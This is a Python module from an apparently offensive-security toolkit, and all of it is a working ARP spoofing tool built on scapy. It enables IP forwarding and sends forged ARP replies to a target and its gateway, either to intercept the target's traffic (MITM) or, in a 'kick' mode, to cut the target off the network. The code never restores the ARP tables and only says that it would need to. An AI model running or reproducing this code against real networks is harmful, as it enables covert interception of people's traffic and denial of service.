"""
ARP Spoofing / MITM Tool
"""

import os
import subprocess
import threading
import time

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt

from redai.core.display import display
from redai.core.utils import run_sudo, enable_ip_forwarding_windows
from redai.database.repository import save_scan


console = Console()


def arp_spoof(
    target_ip: str,
    gateway_ip: str,
    interface: str = "eth0",
    kick: bool = False,
    project: str = "General",
    auto: bool = False
):
    """Ataque MITM (ARP Spoofing) o Network Kick (DoS)."""
    if not auto:
        mode_str = "KICK (DoS)" if kick else "MITM (Intercept)"
        display.header(f"ARP Attack: {mode_str}", f"Target: {target_ip} | Gateway: {gateway_ip}")
    
    # Enable IP forwarding
    if os.name == 'nt':
        enable_ip_forwarding_windows()
    else:
        run_sudo(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
    
    display.warning("Starting ARP poisoning... Press Ctrl+C to stop.")
    
    try:
        from scapy.all import ARP, Ether, sendp, getmacbyip
        
        # Get MAC addresses
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        
        if not target_mac or not gateway_mac:
            display.error("Could not resolve MAC addresses. Check if targets are online.")
            return
        
        display.info(f"Target MAC: {target_mac}")
        display.info(f"Gateway MAC: {gateway_mac}")
        
        # Build ARP packets
        # Tell target that we are the gateway
        pkt_target = Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip
        )
        
        # Tell gateway that we are the target
        pkt_gateway = Ether(dst=gateway_mac) / ARP(
            op=2, pdst=gateway_ip, hwdst=gateway_mac,
            psrc=target_ip
        )
        
        count = 0
        while True:
            sendp(pkt_target, iface=interface, verbose=False)
            if not kick:
                sendp(pkt_gateway, iface=interface, verbose=False)
            
            count += 1
            console.print(f"[cyan]Packets sent: {count * 2}[/cyan]", end="\r")
            time.sleep(1)
            
    except KeyboardInterrupt:
        display.success("Attack stopped by user.")
        
        # Restore ARP tables
        display.step("Restoring ARP tables...")
        # Would need to send correct ARP responses here
        
    except ImportError:
        display.error("Scapy not installed. Run: pip install scapy")
    except Exception as e:
        display.error(f"ARP Attack Error: {e}")
    
    save_scan(f"{target_ip}->{gateway_ip}", "arp_spoof", f"Mode: {'kick' if kick else 'mitm'}", project)
